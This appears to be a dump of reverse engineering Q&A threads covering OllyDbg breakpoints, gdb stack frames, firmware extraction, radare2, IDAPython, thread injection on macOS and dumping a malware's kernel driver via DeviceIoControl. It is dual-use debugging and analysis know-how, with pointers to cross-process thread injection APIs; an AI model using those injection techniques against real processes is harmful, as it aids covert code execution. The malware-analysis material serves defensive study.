<p>I press F9 (Run) and the breakpoint will work. So once EAX becomes 0x10 olly will stop. However when I do this:</p>

<pre><code>UNICODE[EAX] == ""Enter""
</code></pre>

<p>it doesn't work. What am I doing wrong? Doesn't matter which program I use and which Olly version, I can't get this to work. I would like to match strings like ""Enter text"" as well, so any appearance of ""Enter"".</p>

<p>In the end I'm basically looking for a way to stop olly once a specific string is loaded into RAM. How can I achieve this?</p>

<p>Any help is appreciated. Thanks!</p>
","<p>there is a slight syntax change between 1.1 and 2.01 the square are compulsory even when not dereferencing   </p>

<p>so to have a condition where eax points to unicode string you need a condition like   </p>

<p><strong>[UNICODE EAX] == ""what""</strong></p>

<p>suppose you have code like this </p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
wchar_t *strings[] = { L""is this what"", L""does it matter"", L""what is this"",
  L""who are you"", L""why am i doing this"", L""lest scoot from here""
};
PWCHAR foo (int a) {
  return strings[a];
}
int main(void ) {
  for(int i=5;i&gt;=0;i--) {
    printf(""%S\n"",foo(i));
  }
  return 0;
}
</code></pre>

<p>setting a break as shown in screenshot will break correctly in 2.01
<a href=""https://i.stack.imgur.com/YVDVY.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YVDVY.png"" alt=""enter image description here""></a></p>
","13978"
"Return address on ESP?","2278","","<p>I've read that the return address of a function call is always pushed on the ESP stack. But the thing when i tried to see that using <code>gdb</code>, I didn't find it. Here's the program written in C I've used :</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void test_function(int a, int b, int c, int d) {
int flag;
char buffer[10];
flag = 31337;
buffer[0] = 'A';
}

int main() {
  test_function(1, 2, 3, 4);
}
</code></pre>

<p><code>gdb</code> disassemble of this code gives me:</p>

<pre><code>(gdb) disas main
Dump of assembler code for function main:
   0x0804846c &lt;+0&gt;: push   ebp
   0x0804846d &lt;+1&gt;: mov    ebp,esp
   0x0804846f &lt;+3&gt;: and    esp,0xfffffff0
   0x08048472 &lt;+6&gt;: sub    esp,0x10
   0x08048475 &lt;+9&gt;: mov    DWORD PTR [esp+0xc],0x4
   0x0804847d &lt;+17&gt;:    mov    DWORD PTR [esp+0x8],0x3
   0x08048485 &lt;+25&gt;:    mov    DWORD PTR [esp+0x4],0x2
   0x0804848d &lt;+33&gt;:    mov    DWORD PTR [esp],0x1
=&gt; 0x08048494 &lt;+40&gt;:    call   0x804843d &lt;test_function&gt;
   0x08048499 &lt;+45&gt;:    leave  
   0x0804849a &lt;+46&gt;:    ret    
End of assembler dump.
(gdb) x/8xw $esp
0xffffd650: 0x00000001  0x00000002  0x00000003  0x00000004
0xffffd660: 0x080484a0  0x00000000  0x00000000  0xf7e21a83
</code></pre>

<p>As you can see , I've put a breakpoint at <code>0x08048494</code> (before the function call). I can see the arguments being pushed on the stack (1,2,3,4) but , I don't see the return address , which in this case should be <code>0x08048499</code>, right ?</p>
","<p>Lets take this small example code:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int foo (int a)
{
  return a ? a &lt;&lt; 2: 1000;
}

int main()
{
  printf(""The result of foo(10) is %d\n"", foo(10));

  return EXIT_SUCCESS;
}
</code></pre>

<p>Once in assembly we get:</p>

<pre><code>0000000000400506 &lt;foo&gt;:
  400506:       55                      push   %rbp
  400507:       48 89 e5                mov    %rsp,%rbp
  40050a:       89 7d fc                mov    %edi,-0x4(%rbp)
  40050d:       83 7d fc 00             cmpl   $0x0,-0x4(%rbp)
  400511:       74 08                   je     40051b &lt;foo+0x15&gt;
  400513:       8b 45 fc                mov    -0x4(%rbp),%eax
  400516:       c1 e0 02                shl    $0x2,%eax
  400519:       eb 05                   jmp    400520 &lt;foo+0x1a&gt;
  40051b:       b8 e8 03 00 00          mov    $0x3e8,%eax
  400520:       5d                      pop    %rbp
  400521:       c3                      retq   

0000000000400522 &lt;main&gt;:
  400522:       55                      push   %rbp
  400523:       48 89 e5                mov    %rsp,%rbp
  400526:       bf 0a 00 00 00          mov    $0xa,%edi
  40052b:       e8 d6 ff ff ff          callq  400506 &lt;foo&gt;
  400530:       89 c6                   mov    %eax,%esi
  400532:       bf d4 05 40 00          mov    $0x4005d4,%edi
  400537:       b8 00 00 00 00          mov    $0x0,%eax
  40053c:       e8 9f fe ff ff          callq  4003e0 &lt;printf@plt&gt;
  400541:       b8 00 00 00 00          mov    $0x0,%eax
  400546:       5d                      pop    %rbp
  400547:       c3                      retq   
  400548:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  40054f:       00 
</code></pre>

<p>Lets take a look at the following <code>gdb</code> session:</p>

<pre><code>(gdb) break *0x40052b
Breakpoint 1 at 0x40052b: file frame.c, line 13.
(gdb) break *0x400530
Breakpoint 2 at 0x400530: file frame.c, line 13.
</code></pre>

<p>We just set a breakpoint before and after the <code>foo</code> procedure call.</p>

<pre><code>(gdb) break foo
Breakpoint 3 at 0x40050d: file frame.c, line 7.
</code></pre>

<p>We set a breakpoint in the <code>foo</code> procedure.</p>

<pre><code>(gdb) run
Starting program: /home/fleury/tmp/tests/frame 

Breakpoint 1, 0x000000000040052b in main () at frame.c:13
13    printf(""The result of foo(10) is %d\n"", foo(10));
</code></pre>

<p>We start the program and we hit the first breakpoint before the call to <code>foo</code>.</p>

<pre><code>(gdb) info frame
Stack level 0, frame at 0x7fffffffe0c0:
 rip = 0x40052b in main (frame.c:13); saved rip = 0x7ffff7a54b45
 source language c.
 Arglist at 0x7fffffffe0b0, args: 
 Locals at 0x7fffffffe0b0, Previous frame's sp is 0x7fffffffe0c0
 Saved registers:
  rbp at 0x7fffffffe0b0, rip at 0x7fffffffe0b8
</code></pre>

<p>We asked information about the stack frame environment. We can notice that <code>save rip = 0x7ffff7a54b45</code> (which is the return address of the <code>main</code> procedure).</p>

<pre><code>(gdb) continue
Continuing.

Breakpoint 3, foo (a=10) at frame.c:7
7     return a ? a &lt;&lt; 2: 1000;
</code></pre>

<p>We continue the execution of the program and got stopped inside the <code>foo</code> procedure (third breakpoint). Lets ask about the stack frame:</p>

<pre><code> (gdb) info frame
 Stack level 0, frame at 0x7fffffffe0b0:
  rip = 0x40050d in foo (frame.c:7); saved rip = 0x400530
 called by frame at 0x7fffffffe0c0
 source language c.
 Arglist at 0x7fffffffe0a0, args: a=10
 Locals at 0x7fffffffe0a0, Previous frame's sp is 0x7fffffffe0b0
 Saved registers:
  rbp at 0x7fffffffe0a0, rip at 0x7fffffffe0a8
</code></pre>

<p>Note that <code>saved rip = 0x400530</code> which is exactly the position of the next assembly instruction after the <code>call foo</code>.</p>

<pre><code>(gdb) continue
Continuing.

Breakpoint 2, 0x0000000000400530 in main () at frame.c:13
13    printf(""The result of foo(10) is %d\n"", foo(10));
</code></pre>

<p>We keep going in the execution and we reach the second breakpoint at the exit of the <code>foo</code> procedure. Again, lets ask for the return address:</p>

<pre><code>(gdb) info frame
Stack level 0, frame at 0x7fffffffe0c0:
 rip = 0x400530 in main (frame.c:13); saved rip = 0x7ffff7a54b45
 source language c.
 Arglist at 0x7fffffffe0b0, args: 
 Locals at 0x7fffffffe0b0, Previous frame's sp is 0x7fffffffe0c0
 Saved registers:
  rbp at 0x7fffffffe0b0, rip at 0x7fffffffe0b8
</code></pre>

<p>It has been restored to the original value when we popped out of <code>foo</code>.</p>

<p>In fact, the <code>info frame</code> (shortened into <code>i f</code>) also tell where to find the stored return address on the stack:</p>

<pre><code> Saved registers:
  rbp at 0x7fffffffe0b0, rip at 0x7fffffffe0b8
</code></pre>

<p>And, if you ask <code>gdb</code> to display the content of <code>0x7fffffffe0b8</code> you should see <code>0x7ffff7a54b45</code>:</p>

<pre><code>(gdb) print /x *0x7fffffffe0b8
$1 = 0x7ffff7a54b45
</code></pre>
","9232"
"Where to find a hard crackme","2276","","<p>I'd like to improve my skill as a reverse engineer. And thus I am looking for a location to find these.</p>
","<p>Here is a just closed reverse engineering challenge that was posted by Halvar Flake:
<a href=""http://addxorrol.blogspot.kr/2013/01/encouraging-female-reverse-engineers.html"" rel=""nofollow"">http://addxorrol.blogspot.kr/2013/01/encouraging-female-reverse-engineers.html</a></p>

<p>The winner and a link to her very detailed and well written report is linked on this page:
<a href=""http://addxorrol.blogspot.kr/2013/03/congratulations-marion.html"" rel=""nofollow"">http://addxorrol.blogspot.kr/2013/03/congratulations-marion.html</a></p>

<p>This is much more difficult than most crackme's that I have encountered and is an example of a complex and obfuscated piece of Windows malware.</p>
","1548"
"Thread Injection on OSX","2265","","<p>Much reverse engineering has been done on Windows over the years leading to great undocumented functionality, such as using <code>NtCreateThreadEx</code> to <a href=""http://securityxploded.com/ntcreatethreadex.php"">inject</a> threads across sessions.  </p>

<p>On OSX the topic of thread injection seems relatively uncharted.  With the operating system being so incredibly large, where can I begin looking in order to uncover the functionality I desire?</p>

<p>For example, if someone were to ask me this about Windows, I would expect an answer telling me to begin reverse engineering <code>CreateRemoteThread</code> or to start looking at how the kernel creates user threads and point them into <code>ntoskrnl.exe</code>.</p>
","<p>Admittedly, I don't know much about OSX, or even Linux.  But I would suggest looking at the <a href=""http://www.gnu.org/software/gdb/current/"">GDB</a> source code.  GDB somehow is able to attach to running processes in order to debug them.  I would imagine this would, at least, provide similar functionality that you're looking for and prove a decent place to start.</p>

<p>If you're looking for a system call, it appears that <code>ptrace</code> is how GDB might do it.  Also, <a href=""http://www.alexonlinux.com/how-debugger-works"">here's</a> a nice overview of how debuggers work.</p>

<p><strong>Update</strong>: </p>

<p>Actually it seems that Uninformed wrote an <a href=""http://uninformed.org/index.cgi?v=4&amp;a=3"">article</a> that covers this topic somewhat.  In the article they discuss:</p>

<blockquote>
  <p>A lot of people seem to move to Mac OS X from a Linux or BSD
  background and therefore expect the ptrace() syscall to be useful.
  However, unfortunately, this isn't the case on Mac OSX. For some
  ungodly reason, Apple decided to leave ptrace() incomplete and unable
  to do much more than take a feeble attempt at an anti-debug mechanism
  or single step the process.</p>
</blockquote>

<p>Also from that article, it looks like <code>thread_create_running</code> might be the function you're looking for.  <a href=""http://web.mit.edu/darwin/src/modules/xnu/osfmk/man/thread_create_running.html"">Link</a> to the man page.</p>
","1415"
"Executing an IDAPython script with arguments within IDA Pro","2252","","<p>I have an IDAPython script x.py which takes some arguments, which prevents me from simply using <kbd>alt</kbd> + <kbd>F7</kbd> and selecting my script.</p>

<p>How can I execute this script within IDA Pro and specify the arguments for the script?</p>
","<p>Naturally, the best way would be editing the script and have it ask the user for those parameters. IDA has quite a few ways of doing that. You could use one or several of the many <code>idc.Ask*</code> functions. Such as: <code>AskYN</code>, <code>AskLong</code>, <code>AskSelector</code>, <code>AskFunction</code>, <code>AskFile</code> and others. Sometimes when multiple input parameters are needd, it becomes inconvenient to ask for many speciif values, you could then create a full blown dialog instead.</p>

<p>You could create a new process using <code>popen</code> or something similar, but I can't say I recommend doing that.</p>

<p>If depends on how the python script you're trying to execute is implemented, but you're probably better off trying to include/import it in one pythonic way or another.</p>

<h2>Importing a protected module</h2>

<p>If the script is properly written, it probably wraps any execution functionality with an <code>if __name__ == ""__main__""</code> clause, protecting such cases as executing when imported. If that's the case, simply import it with an <code>import modulename</code> and then call its main/whatever.</p>

<h2>Importing a <code>sys.argv</code> module</h2>

<p>If the module directly uses <code>sys.argv</code> and you cannot/would not prevent it from doing so, you can mock your <code>sys.argv</code> before importing the module. Simply doing something like the following should work:</p>

<p><code>sys.argv = ['./script.py', 'command', 'parameter1', 'parameter2', 'optional']
import script
</code></p>

<h2>Calling <code>execfile</code> of the file</h2>

<p>If neither of those approaches works for you, you can always directly call <code>execfile</code> and completely control the context in which the python script is executed. You should read the documentation of <code>execfile</code> and <code>eval</code> <a href=""https://docs.python.org/2/library/functions.html#execfile"" rel=""nofollow"">here</a> and <a href=""https://docs.python.org/2/library/functions.html#eval"" rel=""nofollow"">here</a>, respectively.</p>
","13287"
"Extracting firmware BIN file","2249","","<p>I'm trying to extract this firmware to check whats inside, but can't find how to tackle this file. I was only able to extract and read PNG image.</p>

<p><strong>Binwalk</strong> scan:</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------
199536      0x30B70     LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 392072 bytes
348272      0x55070     LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 10362880 bytes
994916      0xF2E64     LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 10211328 bytes
3911705     0x3BB019    LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 220534 bytes
4078426     0x3E3B5A    LZMA compressed data, properties: 0x03, dictionary size: 65536 bytes, uncompressed size: 1 bytes
4078457     0x3E3B79    LZMA compressed data, properties: 0x03, dictionary size: 65536 bytes, uncompressed size: 1 bytes
4092314     0x3E719A    LZMA compressed data, properties: 0x40, dictionary size: 4194304 bytes, uncompressed size: 16384 bytes
4098794     0x3E8AEA    LZMA compressed data, properties: 0x40, dictionary size: 4194304 bytes, uncompressed size: 16384 bytes
4100954     0x3E935A    LZMA compressed data, properties: 0x40, dictionary size: 4194304 bytes, uncompressed size: 16384 bytes
4103114     0x3E9BCA    LZMA compressed data, properties: 0x40, dictionary size: 4194304 bytes, uncompressed size: 16384 bytes
4105274     0x3EA43A    LZMA compressed data, properties: 0x40, dictionary size: 4194304 bytes, uncompressed size: 16384 bytes
4121895     0x3EE527    LZMA compressed data, properties: 0x0C, dictionary size: 4194304 bytes, uncompressed size: 50 bytes
4141086     0x3F301E    TIFF image data, big-endian
4141279     0x3F30DF    LZMA compressed data, properties: 0x04, dictionary size: 16777216 bytes, uncompressed size: 196608 bytes
4141359     0x3F312F    LZMA compressed data, properties: 0x04, dictionary size: 16777216 bytes, uncompressed size: 520683520 bytes
4145070     0x3F3FAE    LZMA compressed data, properties: 0x0C, dictionary size: 16777216 bytes, uncompressed size: 61503 bytes
4263936     0x411000    PNG image, 924 x 520, 8-bit/color RGBA, non-interlaced
</code></pre>

<p>How to tackle this binary? Is it even possible to get everything from it?</p>

<p>Firmware file is <a href=""ftp://ftp.manta.com.pl/firmware/Telewizory/LED3204vA/"" rel=""nofollow"">here</a> if someone what to try it.</p>
","<p>Binwalk performed a good work in this firmware file, but found too much parts. It worth to know, that Binwalk identifies types based on magic IDs and some other properties. In a typical firmware the parts are stored in compressed and may be in encrypted form. It means, there are some high entropy parts, which possible will not contain any known file type magic ID.</p>

<p>If you see the firmware file with a hex editor, you may see that it contains distinct parts (separated by a lots of 00 or FF bytes):</p>

<pre><code>0x1000-0x55000: Seems to be a bootloader started with an executable part, which was followed by a compressed part from 0x8000.
0x55000-0x3B984F: Main program
0x3B99EC: Various data parts
</code></pre>

<p>In general firmware parts starts with a header, so let's see the header of the main program:</p>

<p><a href=""https://i.stack.imgur.com/r0fgg.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/r0fgg.png"" alt=""Main program header in the firmware""></a></p>

<p>I marked the part name with blue, the size of the part with green and the LZMA header with yellow. As you can see the LZMA header contains the decompressed size (<code>0x9e2000</code> = <code>10362880</code>), but does not contain the compressed size. So, without any knowledge of the header, you can not determine the end of the compressed data, but only guess (for example from the entropy).</p>

<p>We found the main program part, but Binwalk gave a lot more results, so let's check whether other LZMA parts are valid (I changed the description in the original result).</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------
199536      0x30B70     Valid LZMA compressed data containing part of the bootloader or OTA loader
348272      0x55070     Valid LZMA compressed data containing part of the main program
994916      0xF2E64     Valid LZMA compressed data containing other part of the main program
3911705     0x3BB019    Valid LZMA compressed data
4078426     0x3E3B5A    Not LZMA compressed data
4078457     0x3E3B79    Not LZMA compressed data
4092314     0x3E719A    Not LZMA compressed data
4098794     0x3E8AEA    Not LZMA compressed data
4100954     0x3E935A    Not LZMA compressed data
4103114     0x3E9BCA    Not LZMA compressed data
4105274     0x3EA43A    Not LZMA compressed data
4121895     0x3EE527    Not LZMA compressed data
4141086     0x3F301E    TIFF image data, big-endian
4141279     0x3F30DF    Not LZMA compressed data
4141359     0x3F312F    Not LZMA compressed data
4145070     0x3F3FAE    Not LZMA compressed data
4263936     0x411000    PNG image, 924 x 520, 8-bit/color RGBA, non-interlaced
</code></pre>

<p>So, Binwalk identified correctly the first four LZMA compressed part and I think it extracted correctly also. Other parts marked with LZMA compressed data are false positives, because it is an uncompressed data area, which contains low entropy data, which sometimes similar to an LZMA header.</p>

<p>I'd like to draw your attention to the part started at <code>0xf2e64</code>. As I stated previously this area should be in the main part based on the header analysis. However, there is a separated compressed part after the first compressed image. If you check the header again, there is the offset of this second part at <code>0x55028</code>. So, it seems that the main image contains at least two separate parts.</p>
","13471"
"Disassembling an unknown DOS MZ executable using radare2","2245","","<p>How do I specify to radare2 that what I'm disassembling when I know it is a DOS MZ executable?</p>

<p>As it does not auto-detect this for me.</p>
","<p>You can disassemble a DOS 16-bit executable using <a href=""http://www.radare.org"" rel=""noreferrer"">radare2</a> as follows:</p>

<p>Example using <code>TEXTINST.EXE</code> from the FreeDOS 1.1 CDROM image:</p>

<pre><code>bash$ radare2 TEXTINST.EXE
SS : 214f
SP : 4c00
IP : 0
CS : 0
NRELOCS: 1
RELOC  : 1c
CHKSUM : 0
[0000:0020]&gt; aa
[0000:0020]&gt; pd 10
   ;      [0] va=0x00000020 pa=0x00000020 sz=67272 vsz=67272 rwx=-rwx .text
            ;-- section..text:
            0000:0020    b93b03       mov cx, 0x33b
            0000:0023    be7406       mov si, 0x674
            0000:0026    89f7         mov di, si
            0000:0028    1e           push ds
            0000:0029    a9b580       test ax, 0x80b5
        |   0000:002c    8cc8         mov ax, cs
        |   0000:002e    050510       add ax, 0x1005
        |   0000:0031    8ed8         mov ds, ax
        |   0000:0033    05f010       add ax, 0x10f0
        |   0000:0036    8ec0         mov es, ax
(etc)
</code></pre>

<p>If required, you can force the disassembler, etc. to assume DOS as follows:</p>

<pre><code>e asm.arch=x86
e asm.os=dos
</code></pre>

<p>If you think you have a DOS executable and the above doesn't work, there may be something more subtle going on, and you should post a question showing specifically what you tried, what you expect and what is not working.  </p>

<p><em>Note: showing what you tried, etc. is more likely to elicit answers on the SE sites...</em></p>
","4510"
"How to set Message Breakpoints on button in ollyDbg 2.01?","2236","","<p>In OllyDbg 110 there is a point: ""Message breakpoint on ClassProc"".
<img src=""https://i.stack.imgur.com/wGu45.png"" alt=""OllyDbg 110""></p>

<p>At OllyDbg 2.01 I can not find it:</p>

<p><img src=""https://i.stack.imgur.com/4FpW6.png"" alt=""OllyDbg 2.01""></p>
","<pre><code>use conditional log breakpoint and set multiple conditions
</code></pre>

<p><img src=""https://i.stack.imgur.com/FTZZq.png"" alt=""enter image description here""></p>
","6566"
"how to reverse DeviceIoControl?","2222","","<p>I have started reversing this piece of malware. At some point it creates a service and starts it, then immediately it calls the function <code>DeviceIoControl</code> and the malware went from ""paused"" to ""running"" under ollydbg. I've searched a little bit, and I understand that this function serves to communicate with the service it just had created.</p>

<p>But how exactly do I reverse it? How do I know what it does? And how can I continue stepping under ollydbg? Or do I have to move to windbg or some other kernel-mode debugger?</p>
","<p>You cannot step into kernel mode from Ollydbg. You need a kernel debugger like <code>windbg</code>, as <code>ollydbg</code> is a user mode debugger. </p>

<p>Since you posed the question, I assume you neither have a kernel debugging connection,
nor the driver where that control code is sent for analyzing it, as answered by Jonathon.</p>

<p>Usage of proper security measures to deal with malware assumed and emphasized from here onward.</p>

<p>I assume the malware is running already as your query states that you are on <code>DeviceIoControl</code>.</p>

<p>I am going to use ollydbg 2.01.</p>

<p>Attach ollydbg to an unknown process </p>

<p>Press <kbd>Ctrl</kbd>+<kbd>G</kbd> and start typing <code>ntdll.ntDeviceIo</code> and the list box  will show 
<code>ntdll.ntDeviceIoControl</code> now  select it and <code>follow label</code>.</p>

<p>Press <kbd>F2</kbd> to set a breakpoint, and <kbd>F9</kbd> to run the attached process.</p>

<pre><code>INT3 breakpoints, item 0
  Address = 7C90D27E NtDeviceIoControlFile
  Module = ntdll
  Status = Active
  Disassembly = MOV     EAX, 42
  Comment = ntdll.NtDeviceIoControlFile(guessed Arg1,Arg2,Arg3,Arg4,Arg5,Arg6,Arg7,Arg8,Arg9,Arg10)
</code></pre>

<p>Ollydbg should break when a control code is sent and stack should look like this:</p>

<pre><code>CPU Stack
    Address   Value      ASCII Comments
    0013EF50  [7C801675  u€|   ; /RETURN from ntdll.NtDeviceIoControlFile to kernel32.DeviceIoControl+4C
    0013EF54  /00000090        ; |Arg1 = 90
    0013EF58  |00000000        ; |Arg2 = 0
    0013EF5C  |00000000        ; |Arg3 = 0
    0013EF60  |00000000        ; |Arg4 = 0
    0013EF64  |0013EF88  ˆï    ; |Arg5 = 13EF88
    0013EF68  |83050024  $ ƒ   ; |Arg6 = 83050024
    0013EF6C  |00000000        ; |Arg7 = 0
    0013EF70  |00000000        ; |Arg8 = 0
    0013EF74  |0013EFEC  ìï    ; |Arg9 = 13EFEC
    0013EF78  |00000004        ; \Arg10 = 4
</code></pre>

<p>From the specs of <code>DeviceIoControlCode</code>, the first argument points to <code>handle</code> and the sixth argument is the <code>control code</code></p>

<p>Having windbg installed can make things easier from here, but we will not use windbg at this moment as it has a steep learning curve.</p>

<p>Open ollydbg handle window and find what does the handle point to (<code>0x90</code> in the above paste) - it points to a device:</p>

<pre><code>Handles, item 9
  Handle = 00000090
  Type = File (dev)   &lt;-------- it is a _FILE_OBJECT
  Refs =    2.
  Access = 0012019F (FILE_GENERIC_READ|FILE_GENERIC_WRITE)
  Tag =
  Info =
  Translated name = \Device\Dbgv
</code></pre>

<p>Now run <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""noreferrer"">Process Explorer</a> from <code>SysInternals</code>. Select the unknown process, and press <kbd>Ctrl</kbd>+<kbd>H</kbd> to make the lower pane show handles.</p>

<p>Select the handle <code>90</code>, right click and select <code>properties</code>. <em>Process Explorer</em> will show the address of the <em>Device Object</em> as noted by Ollydbg. This device object is a <em>File Object</em>:</p>

<p><img src=""https://i.stack.imgur.com/ZFEXl.png"" alt=""enter image description here""></p>

<p><code>ollydbg 2.01</code> can show memory above <code>0x7fffffff</code> (kernel mode memory) we will use that feature to find the driver associated with this device </p>

<p>Read about the <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff545834.aspx"" rel=""noreferrer""><code>FILE_OBJECT</code></a> structure relevant to your OS. In Windows XP you will find the address of device object at +4 from file object.</p>

<p>Select the dump window press <kbd>Ctrl</kbd>+<kbd>G</kbd> and type in the address process explorer showed viz </p>

<pre><code>863c87f0 and follow expression 

CPU Dump
Address   Hex dump                                         ASCII
863C87F0  05 00 70 00|A8 D3 51 86|00 00 00 00|00 00 00 00|  p ¨ÓQ†
</code></pre>

<p>So <code>8651d3a8</code> in the paste above points to the device object for this file object.</p>

<p>Read about <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff543147.aspx"" rel=""noreferrer""><code>DEVICE_OBJECT</code></a> structure.  In Windows XP, the address of the driver object is at device object + 8.  Following there with <kbd>Ctrl</kbd>+<kbd>G</kbd> -> <code>follow expression</code> as done earlier</p>

<pre><code>CPU Dump
Address   Hex dump                                         ASCII
8651D3A8  03 00 B8 00|01 00 00 00|48 2C F1 86|00 00 00 00|  ¸    H,ñ†
</code></pre>

<p>notice <code>86f12c48</code> is driver object. Read about <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff544174.aspx"" rel=""noreferrer""><code>DRIVER_OBJECT</code></a> structure.</p>

<p><code>+0xc is Driver Start</code> and <code>+0x10 is Driver Size</code> --> <kbd>Ctrl</kbd>+<kbd>G</kbd> to follow:</p>

<pre><code>CPU Dump
Address   Hex dump                                         ASCII
86F12C48  04 00 A8 00|A8 D3 51 86|12 00 00 00|00 30 2A A9|  ¨ ¨ÓQ†    0*©
86F12C58  00 3D 00 00|48 9C D8 86|F0 2C F1 86|18 00 18 00|  =  HœØ†ð,ñ† 
</code></pre>

<p><code>a92a3000</code> is <code>DriverStart</code> and size of driver is <code>3d00</code>.</p>

<p><kbd>Ctrl</kbd>+<kbd>G</kbd> to follow:</p>

<pre><code>CPU Dump
Address   Hex dump                                         ASCII
A92A3000  4D 5A 90 00|03 00 00 00|04 00 00 00|FF FF 00 00| MZ       ÿÿ
A92A3010  B8 00 00 00|00 00 00 00|40 00 00 00|00 00 00 00| ¸       @
</code></pre>

<p>The famous <code>IMAGE_DOS_HEADER</code> is noticeable.</p>

<p>Select from <code>a92a3000</code> to <code>a92a6d00</code>,  <kbd>Right-Click</kbd> -> <code>Edit</code> -> binary copy and paste the bytes to a new file in any hex editor (HxD for example), and save it as <code>malwaredriver.sys</code> :)</p>

<pre><code>foo:\&gt;dir malwaredriver.sys

26/03/2014  14:04            15,616 malwaredriver.sys

\&gt;set /a 0x3d00
15616
\&gt;file malwaredriver.sys

malwaredriver.sys; PE32 executable for MS Windows (native) Intel 80386 32-bit

:\&gt;
</code></pre>

<p>You can now analyze the driver statically.</p>

<p>Read about <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff544174.aspx"" rel=""noreferrer""><code>DRIVER_OBJECT</code></a> structure carefully to find you can readily know the handler for <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff550744.aspx"" rel=""noreferrer""><code>IRP_MJ_DEVICE_IO_CONTROL</code></a> handler in ollydbg. It would be at <code>+0x70</code> from Driverobject in XP. For this particular driver, the <code>IRP_MJ_DEVICE_IO_CONTROL_HANDLER</code> is at </p>

<pre><code>CPU Dump
Address   Value      ASCII Comments
86F12CB8   A92A4168  hA*©
</code></pre>

<p>You can follow and disassemble this memory in ollydbg. Select cpu dump press ctrl+g to disassemble an unknown driver </p>

<pre><code>CPU Disasm
Address   Command                             Comments
A92A4168  MOV     EDI, EDI                    ; IRP_MJ_DEVICE_IO_CONTROL_HANDLER(pdevob,pirp)
A92A416A  PUSH    EBP
A92A416B  MOV     EBP, ESP
A92A416D  SUB     ESP, 24
A92A4170  PUSH    EBX
A92A4171  PUSH    ESI
A92A4172  MOV     ESI, DWORD PTR SS:[EBP+0C]  ; irp
A92A4175  MOV     EAX, DWORD PTR DS:[ESI+60]  ; nt!_irp -y Tail.overlay.cur-&gt;maj
A92A4178  MOV     EDX, DWORD PTR DS:[ESI+0C]  ; nt!_irp Tail.overlay.cur-&gt;par.DeviceIo.ty
A92A417B  XOR     EBX, EBX
A92A417D  PUSH    EDI
A92A417E  LEA     EDI, [ESI+18]
A92A4181  MOV     DWORD PTR DS:[EDI], EBX
A92A4183  MOV     DWORD PTR DS:[ESI+1C], EBX
A92A4186  MOVZX   ECX, BYTE PTR DS:[EAX]
A92A4189  SUB     ECX, EBX
A92A418B  JE      SHORT A92A41F7              ; case 0 create
A92A418D  DEC     ECX
A92A418E  DEC     ECX
A92A418F  JE      SHORT A92A41CA              ; case 2 close
A92A4191  SUB     ECX, 0C
A92A4194  JNE     A92A42BB                    ; unhandled
A92A419A  MOV     ECX, DWORD PTR DS:[EAX+0C]  ; ioctl
A92A419D  MOV     EBX, ECX
A92A419F  AND     EBX, 00000003
A92A41A2  CMP     BL, 3
A92A41A5  JNE     SHORT A92A41AC              ; buff align
A92A41A7  MOV     EBX, DWORD PTR DS:[ESI+3C]
A92A41AA  JMP     SHORT A92A41AE
A92A41AC  MOV     EBX, EDX                    ; inbuff
A92A41AE  PUSH    DWORD PTR SS:[EBP+8]        ; devobj
A92A41B1  PUSH    EDI
A92A41B2  PUSH    ECX
A92A41B3  PUSH    DWORD PTR DS:[EAX+4]        ; bufflen
A92A41B6  PUSH    EBX
A92A41B7  PUSH    DWORD PTR DS:[EAX+8]        ; ioctlcode
A92A41BA  PUSH    EDX
A92A41BB  PUSH    1
A92A41BD  PUSH    DWORD PTR DS:[EAX+18]       ; fobj
A92A41C0  CALL    A92A3EEC                    ; actual_handler
</code></pre>

<p>Here the ioctl code is handled:</p>

<pre><code>CPU Disasm
Address   Command                                  Comments
A92A3EF8  MOV     ESI, DWORD PTR SS:[EBP+24]
A92A3EFB  XOR     EBX, EBX
A92A3EFD  MOV     DWORD PTR DS:[ESI], EBX
A92A3EFF  MOV     DWORD PTR DS:[ESI+4], EBX
A92A3F02  MOV     ECX, DWORD PTR SS:[EBP+20]
A92A3F05  MOV     EAX, 83050020
A92A3F0A  CMP     ECX, EAX
A92A3F0C  JA      A92A40F1  this code will take this path as 24 &gt; 20
</code></pre>

<p>===========</p>

<pre><code>CPU Disasm
Address     Hex dump                  Command                Comments
A92A40F1    81F9 24000583             CMP     ECX, 83050024
A92A40F7    74 3F                     JE      SHORT A92A4138 path taken
</code></pre>

<p>The control code does this work and sends some 320 on some condition</p>

<pre><code>[code]
CPU Disasm
Address   Command                             Comments
A92A4138  PUSH    4
A92A413A  POP     EAX
A92A413B  CMP     DWORD PTR SS:[EBP+1C], EAX
A92A413E  JB      SHORT A92A4152
A92A4140  MOV     ECX, DWORD PTR SS:[EBP+18]
A92A4143  CMP     ECX, EBX
A92A4145  JE      SHORT A92A4152
A92A4147  MOV     DWORD PTR DS:[ECX], 320      &lt;------------
A92A414D  MOV     DWORD PTR DS:[ESI+4], EAX
A92A4150  JMP     SHORT A92A4158
A92A4152  MOV     DWORD PTR DS:[ESI], C000000D
A92A4158  MOV     AL, 1
A92A415A  CALL    A92A46D5
A92A415F  RETN    24
</code></pre>

<p>The driver analysed here is the driver loaded by dbgview (dbgv.sys) from SysInternals. This control code checks for an incompatible version of driver loaded in memory. Follow through can be practiced with the specific driver and specific version:</p>

<pre><code>(4.75) build time Thu Aug 07 04:51:27 2008
</code></pre>

<h2>EDIT</h2>

<p>With windbg inastalled you can do the same with just few commands as posted below</p>

